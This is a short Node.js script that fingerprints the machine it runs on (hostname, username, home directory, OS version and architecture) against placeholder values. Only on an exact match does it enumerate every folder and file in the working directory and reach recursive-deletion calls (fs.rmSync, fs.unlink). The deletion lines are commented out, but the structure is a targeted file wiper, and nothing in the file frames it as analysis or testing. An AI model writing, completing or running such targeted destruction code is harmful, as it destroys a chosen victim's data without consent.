const glob = require("glob");
const os = require('node:os');
const fs = require('node:fs');

const data = {
"HOSTNAME": 'userhostname',
"USERNAME": 'userusername',
"HOMEDIR": 'userhomedir',
"VERSION": 'userversion',
"WINVER": 'userrelease',
"ARCH": 'userarch',
}

const pcinfo = {
"HOSTNAME": os.hostname(),
"USERNAME": os.userInfo().username,
"HOMEDIR": os.homedir(),
"VERSION": os.version(),
"WINVER": os.release(),
"ARCH": os.arch(),
}

if (
    pcinfo.HOSTNAME == data.HOSTNAME && 
    pcinfo.USERNAME == data.USERNAME && 
    pcinfo.HOMEDIR == data.HOMEDIR && 
    pcinfo.VERSION == data.VERSION && 
    pcinfo.WINVER == data.WINVER && 
    pcinfo.ARCH == data.ARCH
) {
    glob.sync("./*/").map(resources => {
        console.log(resources)
        if (resources == "./System Volume Information/") return;
        //fs.rmSync(resources, {recursive: true});
    })

    glob.sync("./*.*").map(resource => {
        //fs.unlink(resource, (err) => {});
    })
}
